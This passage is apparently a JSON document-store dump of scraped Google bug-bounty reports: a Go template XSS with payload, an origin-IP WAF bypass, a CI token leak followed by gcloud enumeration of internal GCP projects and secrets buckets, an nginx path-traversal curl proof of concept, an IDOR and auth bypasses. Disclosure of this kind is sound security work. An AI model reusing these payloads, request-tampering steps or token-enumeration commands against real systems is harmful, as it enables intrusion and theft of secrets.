Enter)\r\nGoogle\r\nBug Hunters\r\nPotential XSS in html/template in golang\r\nReported by:\r\nSohom                          Datta\r\nGoogle VRP\r\ntriaged\r\n21:16 | Feb 27, 2023\r\naccepted\r\n20:37 | Mar 10, 2023\r\nfixed\r\n15:27 | Sep 28, 2023\r\nreward decided\r\n$7,500\r\nSummary:\r\nPotential XSS in html/template in golang\r\nProduct:\r\nGolang\r\nURL:\r\nhttps://pkg.go.dev/html/template\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nhtml/template\r\ndoes not respect the '`' (backtick) character which can be used while defining strings in Javascript. This can/could potentially be used to perform XSS on a server using html/template as it's templating engine.\r\nAttack scenario\r\nFor example for the following html template code:\r\n<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <meta charset=\"UTF-8\">\r\n        <title>Hello, {{.Name}}</title>\r\n        <script>\r\n            var welcome_msg = `Hello,  <a href='/{{.UserID}}'>{{.Name}}</a>`;\r\n            const h1 = document.createElement('h1');\r\n            h1.innerHTML = welcome_msg;\r\n            document.body.appendChild(h1);\r\n        </script>\r\n        <style>\r\n        </style>\r\n    </head>\r\n    <body>\r\n    </body>\r\n</html>\r\nIf the following data is provided:\r\n{\r\n    Name:   \"My page`; eval(`alert(1)`); var tmp =`\",\r\n    UserID: \"4ebe354b-cb01-45b5-aa3e-aa2fe2f98091\",\r\n}\r\nThe resulting html page (output page attached) that is rendered by the template engine will allow the attacker to evaluate arbitrary javascript (in our case it will evaluate alert(1))\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1537, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "02641c1d-995b-47d5-85a5-fa20a394b757": {"__data__": {"id_": "02641c1d-995b-47d5-85a5-fa20a394b757", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_664605.txt", "file_name": "20250408_175656_664605.txt", "file_type": "text/plain", "file_size": 3640, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "74d9bff8-98af-4bdf-bf8d-bba69cabd6b9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_664605.txt", "file_name": "20250408_175656_664605.txt", "file_type": "text/plain", "file_size": 3640, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "73ed7714202b3bf5140db7bc73214b93710a27373479771c4b9d293d7cbb7c53", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nCloud Flare Bypass Origin IP's Lead To Access To lab.mandiant.com    Description: I have discovered that the https://216.71.112.199/  site exposed it's IP which could allow bypassing of anti-DDoS mech\r\nGoogle VRP\r\ntriaged\r\n18:41 | Feb 20, 2023\r\naccepted\r\n02:20 | Feb 25, 2023\r\nfixed\r\n22:28 | Mar 16, 2023\r\nSummary:\r\nCloud Flare Bypass Origin IP's Lead To Access To lab.mandiant.com    Description: I have discovered that the\r\nhttps://216.71.112.199/\r\nsite exposed it's IP which could allow bypassing of anti-DDoS mech\r\nProduct:\r\nlab.mandiant.com\r\nURL:\r\nhttps://216.71.112.199/\r\nVulnerability type:\r\nunknown\r\nDetails\r\nCloud Flare Bypass Origin IP's Lead To Access To lab.mandiant.com\r\nDescription:\r\nI have discovered that the\r\nhttps://216.71.112.199/\r\nsite exposed it's IP\r\nwhich could allow bypassing of anti-DDoS mechanisms i.e you are using\r\nCloudflare for protection.\r\nFor Originate IP address which I found from\r\nhttps://shodan.io\r\nBy using these IP address as a resolver instead of the intended\r\naddresses I'm able to access the service without going through the\r\nWAF, thus I'm able to forward unfiltered payloads to the service, as\r\nwell as avoiding the common protections offered by Cloudflare, also\r\nbeing able to perform crippling denial-of-service towards the origin.\r\nIp Exposed\r\nhttps://216.71.112.199/\r\nImpact:\r\nAs reported in many other submissions, Cloudflare bypasses can have a\r\nsignificant impact, as any adversary is now able to communicate with\r\nthe origin server directly, enabling them to perform unfiltered\r\nattacks (such as denial-of-service), and data retrieval\r\nIt makes the implementation of WAF on that domain useless since an attacker is able to directly access the server using its IP, WAF bypasses can have a significant impact, as any adversary is now able to communicate with the origin server directly, enabling them to perform unfiltered attacks (such as denial-of-service), and data retrieval.\r\nNOTE:\r\nIn attached POC it clears Demonstrates that the accompanied domain runs the same content as the IP\r\nThe Ip is Not Protected by Cloudflare\r\nAttack scenario\r\nCloud Flare Bypass Origin IP's Lead To Access To lab.mandiant.com\r\nDescription:\r\nI have discovered that the\r\nhttps://216.71.112.199/\r\nsite exposed it's IP\r\nwhich could allow bypassing of anti-DDoS mechanisms i.e you are using\r\nCloudflare for protection.\r\nFor Originate IP address which I found from\r\nhttps://shodan.io\r\nBy using these IP address as a resolver instead of the intended\r\naddresses I'm able to access the service without going through the\r\nWAF, thus I'm able to forward unfiltered payloads to the service, as\r\nwell as avoiding the common protections offered by Cloudflare, also\r\nbeing able to perform crippling denial-of-service towards the origin.\r\nIp Exposed\r\nhttps://216.71.112.199/\r\nImpact:\r\nAs reported in many other submissions, Cloudflare bypasses can have a\r\nsignificant impact, as any adversary is now able to communicate with\r\nthe origin server directly, enabling them to perform unfiltered\r\nattacks (such as denial-of-service), and data retrieval\r\nIt makes the implementation of WAF on that domain useless since an attacker is able to directly access the server using its IP, WAF bypasses can have a significant impact, as any adversary is now able to communicate with the origin server directly, enabling them to perform unfiltered attacks (such as denial-of-service), and data retrieval.\r\nNOTE:\r\nIn attached POC it clears Demonstrates that the accompanied domain runs the same content as the IP\r\nThe Ip is Not Protected by Cloudflare\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3624, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "151b8663-8455-4d26-8dc9-ae7df7104dbd": {"__data__": {"id_": "151b8663-8455-4d26-8dc9-ae7df7104dbd", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.txt", "file_name": "20250408_175658_772653.txt", "file_type": "text/plain", "file_size": 5442, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "96f4886e-da68-4538-8db9-165311fb9b71", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.txt", "file_name": "20250408_175658_772653.txt", "file_type": "text/plain", "file_size": 5442, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "931911bc031d4c8640d69ffb016fb71b871ed658c35d8cc3b3d8ef260b4aa668", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "5b0409b7-79c2-4018-b318-1dd8088bc10c", "node_type": "1", "metadata": {}, "hash": "377876219e041fc304a18a4aad29a711b37b7f337b7a38a0db56a59c69efa2ec", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nInternal GCP Access - GoogleCloudPlatform/magic-modules\r\nReported by:\r\nDivyanshu\r\nGoogle VRP\r\ntriaged\r\n02:18 | Feb 7, 2023\r\naccepted\r\n03:55 | Feb 11, 2023\r\ntriaged\r\n17:24 | Mar 3, 2023\r\naccepted\r\n04:30 | Mar 8, 2023\r\nfixed\r\n08:26 | Apr 7, 2023\r\nreward decided\r\n$31,337\r\nSummary:\r\nInternal GCP Access - GoogleCloudPlatform/magic-modules\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/magic-modules/\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHi team,\r\nRaising a malicious PR on internet can leak out access tokens which allows for backend GCP enumeration of resource being used by the build systems.\r\nSteps :-\r\nRaise a PR (Exploit PR in this case :\r\nhttps://github.com/GoogleCloudPlatform/magic-modules/pull/7228\r\n)\r\nWait for Access tokens to be retrived and we see that these access tokens are valid for multiple projects\r\n[root@ip-172-31-86-82 ~]# gcloud --access-token-file /tmp/token projects list\r\nPROJECT_ID                   NAME                         PROJECT_NUMBER\r\nci-bq-external-data-project  ci-bq-external-data-project  821080836656\r\nci-gke-43e65a86-495d         ci-gke-43e65a86              76432828804\r\nci-gsuite-sa-project         ci-gsuite-sa-project         1013948302907\r\nci-media-cdn-vod-project     ci-media-cdn-vod-project     979258774428\r\nci-terraform-validator-fef2  ci-terraform-validator       998476993360\r\nci-vm-module-2c6c            ci-vm-module                 1009530108401\r\nci-vm-module-87bd            ci-vm-module                 188723441739\r\nf12debc7e5c0087c5p-tp        f12debc7e5c0087c5p-tp        348315023304\r\ngraphite-docker-images       graphite-docker-images       673497134629\r\nNow we simply enumerate\r\nAttack scenario\r\nEnumeration done so far :-\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gke-43e65a86-495d --access-token-file /tmp/token compute instances list\r\nNAME                                                 ZONE           MACHINE_TYPE   PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP     STATUS\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-4lzr  us-central1-a  e2-standard-4               10.0.0.4     34.170.211.41   RUNNING\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-7d2r  us-central1-a  e2-standard-4               10.0.0.6     104.154.79.164  RUNNING\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-np60  us-central1-a  e2-standard-4               10.0.0.5     34.67.29.131    RUNNING\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-v0m9  us-central1-a  e2-standard-4               10.0.0.3     34.71.202.178   RUNNING\r\nsafer-cluster-iap-bastion-bastion                    us-central1-a  g1-small                    10.10.10.2                   RUNNING\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gke-43e65a86-495d --access-token-file /tmp/token container clusters list\r\nNAME                  LOCATION       MASTER_VERSION  MASTER_IP      MACHINE_TYPE   NODE_VERSION      NUM_NODES  STATUS\r\nsimple-zonal-cluster  us-central1-a  1.24.7-gke.900  35.224.32.156  e2-standard-4  1.24.5-gke.600 *  4          RUNNING\r\n\r\n* - There is an upgrade available for your cluster(s).", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3147, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "5b0409b7-79c2-4018-b318-1dd8088bc10c": {"__data__": {"id_": "5b0409b7-79c2-4018-b318-1dd8088bc10c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.txt", "file_name": "20250408_175658_772653.txt", "file_type": "text/plain", "file_size": 5442, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "96f4886e-da68-4538-8db9-165311fb9b71", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.txt", "file_name": "20250408_175658_772653.txt", "file_type": "text/plain", "file_size": 5442, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "931911bc031d4c8640d69ffb016fb71b871ed658c35d8cc3b3d8ef260b4aa668", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "151b8663-8455-4d26-8dc9-ae7df7104dbd", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.txt", "file_name": "20250408_175658_772653.txt", "file_type": "text/plain", "file_size": 5442, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "2feccaa564ac57002be7e895746d8985f614479b8d04d58c8192c80fb1676d3f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "To upgrade nodes to the latest available version, run\r\n  $ gcloud container clusters upgrade NAME\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token storage ls\r\ngs://ci-bq-external-data/\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token storage ls gs://ci-bq-external-data/\r\ngs://ci-bq-external-data/bigquery-external-table-test.csv\r\ngs://ci-bq-external-data/hive_partition_example/\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token compute instances list\r\nListed 0 items.\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token iam service-accounts list\r\nDISPLAY NAME                                         EMAIL                                                                        DISABLED\r\nci-bq-external-data-project Project Service Account  project-service-account@ci-bq-external-data-project.iam.gserviceaccount.com  False\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token iam service-accounts keys list --iam-account project-service-account@ci-bq-external-data-project.iam.gserviceaccount.com\r\nKEY_ID                                    CREATED_AT            EXPIRES_AT            DISABLED\r\n496c1979068d16025af9b21dee633ab3a937b81f  2022-11-25T16:03:52Z  2024-11-27T09:05:32Z\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gsuite-sa-project --access-token-file /tmp/token storage ls\r\ngs://ci-gsuite-sa-secrets/\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gsuite-sa-project --access-token-file /tmp/token storage ls gs://ci-gsuite-sa-secrets/\r\ngs://ci-gsuite-sa-secrets/gsuite-sa.json\r\n[root@ip-172-31-86-82 ~]# gcloud --project graphite-docker-images --access-token-file /tmp/token storage ls\r\ngs://artifacts.graphite-docker-images.appspot.com/\r\ngs://cloud-build-bigquery-notifiers/\r\ngs://cloud-build-chat-notifiers/\r\ngs://gcf-sources-673497134629-us-central1/\r\ngs://graphite-docker-images.appspot.com/\r\ngs://graphite-docker-images_cloudbuild/\r\ngs://staging.graphite-docker-images.appspot.com/\r\ngs://us.artifacts.graphite-docker-images.appspot.com/\r\ngs://vcr-cassettes/\r\ngs://vcr-logs/\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3151, "end_char_idx": 5426, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b81b570e-8eaa-46a1-b7a6-5208e01e8090": {"__data__": {"id_": "b81b570e-8eaa-46a1-b7a6-5208e01e8090", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_804230.txt", "file_name": "20250408_175658_804230.txt", "file_type": "text/plain", "file_size": 1585, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e85c1ce5-9e61-4cb2-ac5e-3341b93ce5cf", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_804230.txt", "file_name": "20250408_175658_804230.txt", "file_type": "text/plain", "file_size": 1585, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7312a5e40f637db3710821f5fbd1fec5bffb0dc48db9e0634baa1ecb5d853bb8", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nNginx alias path traversal on HPC Toolkit dashboard\r\nReported by:\r\nCelesian\r\nGoogle VRP\r\ntriaged\r\n10:57 | Jan 30, 2023\r\naccepted\r\n21:30 | Jan 30, 2023\r\ntriaged\r\n16:14 | Feb 9, 2023\r\naccepted\r\n00:23 | Feb 28, 2023\r\nfixed\r\n23:12 | Mar 2, 2023\r\nreward decided\r\n$500\r\nSummary:\r\nNginx alias path traversal on HPC Toolkit dashboard\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/hpc-toolkit/raw/main/community/front-end/ofe/website/nginx.conf\r\nVulnerability type:\r\nFile Inclusion\r\nDetails\r\nWhile analysing some of HPC's ToolKit source-code, a front-end dashboard application was found. This application has a Docker image and some config files for deploying it.\r\nOne of those config files is the nginx.conf file, which has a popular nginx misconfiguration called Nginx Alias Traversal, which happens when a\r\nlocation\r\ndirective doesn't end with a trailing slash, but an\r\nalias\r\ndirective inside it does.\r\nHere's a sample of the vulnerable code on the repository:\r\nlocation /static {\r\n            alias ../hpc-toolkit/community/front-end/website/static/;\r\n}\r\nThis vulnerability allows attackers to exfiltrate files of the webserver. Here's a Proof-of-Concept:\r\ncurl http://<HPC Toolkit URL>/static../website/settings.py\r\nAttack scenario\r\nAn attacker can exfiltrate files of the webserver, leaking the secret token was not possible yet because the .secret_key file resides two directory levels above, making accessing it through the path traversal not possible.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1569, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8021fd5d-ec7b-49d5-bb63-b25a920dbcc0": {"__data__": {"id_": "8021fd5d-ec7b-49d5-bb63-b25a920dbcc0", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_865168.txt", "file_name": "20250408_175658_865168.txt", "file_type": "text/plain", "file_size": 1542, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5a11ab77-d730-4737-97e4-0e94c752af01", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_865168.txt", "file_name": "20250408_175658_865168.txt", "file_type": "text/plain", "file_size": 1542, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "dc5400adbe786ad07e6d6d0faf655e00a6cfc5da65f0c68d827bea56bbf7f67c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSubDomain Takeover\r\nReported by:\r\nbang\r\nGoogle VRP\r\ntriaged\r\n22:42 | Jan 13, 2023\r\naccepted\r\n00:48 | Jan 14, 2023\r\nfixed\r\n17:24 | Apr 21, 2023\r\nSummary:\r\nSubDomain Takeover\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nhttps://brightbytes.net\r\nURL:\r\nhttps://sdmc.proxy.staging.clarity.brightbytes.net/\r\nVulnerability type:\r\nOther\r\nDetails\r\nHello,\r\nthis is pretty serious security issue in some context, so please act as fast as possible.\r\nOverview:\r\nOne of the brightbytes.net subdomains is pointing to heroku, which has unclaimed CNAME record. ANYONE is able to own brightbytes.net subdomain at the moment.\r\nThis vulnerability is called subdomain takeover. You can read more about it here:\r\nhttps://blog.sweepatic.com/subdomain-takeover-principles/\r\nhttps://hackerone.com/reports/32825\r\nhttps://hackerone.com/reports/175070\r\nhttps://hackerone.com/reports/172137\r\nDetails:\r\n     sdmc.proxy.staging.clarity.brightbytes.net has cname  shrouded-caverns-8102.pure-basin-7604.herokuspace.com however it  is not registered in Heroku anymore and thus can be registered by anyone. After registering the Cloud App in the person doing so has full control over content on sdmc.proxy.staging.clarity.brightbytes.net\r\nMitigation:\r\nRemove the CNAME record from starbucks.com DNS zone completely.\r\nClaim it back in Azure portal after I release it\r\nRegards,\r\n[REDACTED_USERNAME]\r\nAttack scenario\r\nANYONE is able to own brightbytes.net subdomain at the moment.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1526, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "873897d9-6e8a-4a23-931b-4fc11092b26f": {"__data__": {"id_": "873897d9-6e8a-4a23-931b-4fc11092b26f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_899111.txt", "file_name": "20250408_175658_899111.txt", "file_type": "text/plain", "file_size": 2057, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "440cf506-8894-451f-921e-ffd81cb06f82", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_899111.txt", "file_name": "20250408_175658_899111.txt", "file_type": "text/plain", "file_size": 2057, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "036be9d68a3d5a52cb4eb3ac22caa33b2467ca2971771af17a937fc3e2913179", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nIDOR on terra-devel-flagsmith.api.verily.com can create a master-api-key on different organisations.\r\nReported by:\r\nNuman Khan\r\nGoogle VRP\r\ntriaged\r\n21:40 | Jan 11, 2023\r\naccepted\r\n08:45 | Jan 13, 2023\r\nfixed\r\n16:03 | Feb 16, 2023\r\nreward decided\r\n$100\r\nSummary:\r\nIDOR on terra-devel-flagsmith.api.verily.com can create a master-api-key on different organisations.\r\nProduct:\r\nOther - Google VRP\r\nURL:\r\nhttps://terra-devel-flagsmith.api.verily.com/organisation-settings#\r\nVulnerability type:\r\nOther\r\nDetails\r\nHello security security team.\r\nHope you're good there.\r\nI found idor on terra-devel-flagsmith.api.verily.com subdomain which can create api key for another organizations.\r\nThat subdomain hosted a open-source software called flagsmith .\r\nAll I think is verily developers using this for remote config management.\r\nThere is a master key which is also called terraform key . The use of the key is specified in documentation\r\nhttps://docs.flagsmith.com/integrations/terraform\r\n.\r\nI found that an Attacker can create apo-key for other victim's organization .\r\nSteps to reproduce\r\nMake two different account with different emails and make different organisations with respective to that accounts.\r\nafter logged in click on manage then you'll land on some settings page.\r\nClick on button next to terraform api keys .\r\nThe options ask you to name the respective api key and set expiration limit.\r\nTurn on intercept in burp proxy now .\r\nSet the name something and date to never And click create.\r\nThe POST request is going to endpoint\r\n/api/v1/organisations/{your org I'd }/master-api-keys/\r\n.\r\nChange the value of organisation in body to the victims organization id.\r\nSend the request and see in the other account the new api key is created.\r\nAn attacker also has that api-key.\r\nAttack scenario\r\nAn attacker can later use that key to integrate with .ther orgs account .\r\nAs I mentioned attacker also know the api-key which is the master key of victim's organization now.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2041, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "69511f88-80d1-487d-97d8-b1a206ff05d8": {"__data__": {"id_": "69511f88-80d1-487d-97d8-b1a206ff05d8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_930540.txt", "file_name": "20250408_175658_930540.txt", "file_type": "text/plain", "file_size": 1724, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6766760c-589c-474f-8ada-3e1995bdfaa1", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_930540.txt", "file_name": "20250408_175658_930540.txt", "file_type": "text/plain", "file_size": 1724, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "a38912c10ca101f9f116212e0495fc1e16a1fca40b6a3f63480aed41a47f167a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in verily.com\r\nReported by:\r\nAyush Sahu\r\nGoogle VRP\r\ntriaged\r\n18:13 | Jan 3, 2023\r\naccepted\r\n20:53 | Jan 3, 2023\r\nfixed\r\n19:16 | Jan 20, 2023\r\nGoogle comment\r\nThe panel decided that the security impact of this issue did not meet the criteria to qualify for a reward (Users can create accounts and can create help desk tickets. However, they cannot view tickets created by other users, or modify any of the existing tickets).\r\nSummary: Unauthorized access of jira admin & Api rest information disclosing by jira service.\r\nSteps to reproduce:\r\nGo to URL:\r\nhttps://verily.atlassian.net/servicedesk/customer/user/signup\r\nNow enter an email for signup and get conformation link.\r\nAfter signup we have access of admin with there service.\r\nNow one by check all 5 tabs available in jira page. with all access of edit, delete, request, and manipulation access without authorization.\r\nNow again visit URL by Incognito windows:\r\nhttps://verily.atlassian.net/rest/api/2/dashboard?maxResults=100\r\nhttps://verily.atlassian.net/jira/projects\r\nNow by first url we have unauthorized api rest information disclosing.\r\nSecond one for verifying the product of \"verily\".\r\nBrowser/OS: Chrome/Windows11\r\nSolution: Update the jira version for verily server and domains.\r\nPoc: I have attached a video for step to step demonstration \r\nVideo Link:\r\nhttps://1drv.ms/v/s!ApqnwYzfSjpShBz5vyEtDKxFTev1\r\nAttack scenario:\r\nAs an attacker I have admin access with full authorized like delete, edit, request, change, and manipulation access. And also have rest api unauthorized information disclosing of admin.\r\nAcquisition info:\r\nyes, it's product of google.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1708, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d3c78e04-4164-4eef-9222-c93453c31c6f": {"__data__": {"id_": "d3c78e04-4164-4eef-9222-c93453c31c6f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_962207.txt", "file_name": "20250408_175658_962207.txt", "file_type": "text/plain", "file_size": 3466, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d2f83b4d-8c77-404f-bc10-3340ce7a5717", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_962207.txt", "file_name": "20250408_175658_962207.txt", "file_type": "text/plain", "file_size": 3466, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "a94878b6f1b2d2ff3cd809a74b7be57fba5e220d66146ff4254c03295122e968", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nNest Pro Portal API allows bypassing admin verification for self-granted access\r\nReported by:\r\nRyan Kovatch\r\nGoogle VRP\r\ntriaged\r\n16:20 | Dec 30, 2022\r\naccepted\r\n18:19 | Dec 30, 2022\r\nfixed\r\n13:58 | Feb 12, 2023\r\nreward decided\r\n$500\r\nSummary:\r\nNest Pro Portal API allows bypassing admin verification for self-granted access\r\nProduct:\r\nGoogle Nest Services\r\nURL:\r\nhttps://nest.google.com/pro\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nThe Nest Pro Portal API (\r\nalkalinestproportal-pa.googleapis.com\r\n) has a PATCH method at\r\n/v1/organizations/{organizationId}\r\nthat edits an existing Nest Pro organization provided a JSON object and an update mask. When a user applies for Nest Pro status on behalf of their business, a new organization is created on the server with its\r\nstatus\r\nkey set to\r\nPENDING\r\n. The PATCH method allows a user to set their organization's status to\r\nAPPROVED\r\n, bypassing admin inspection and granting 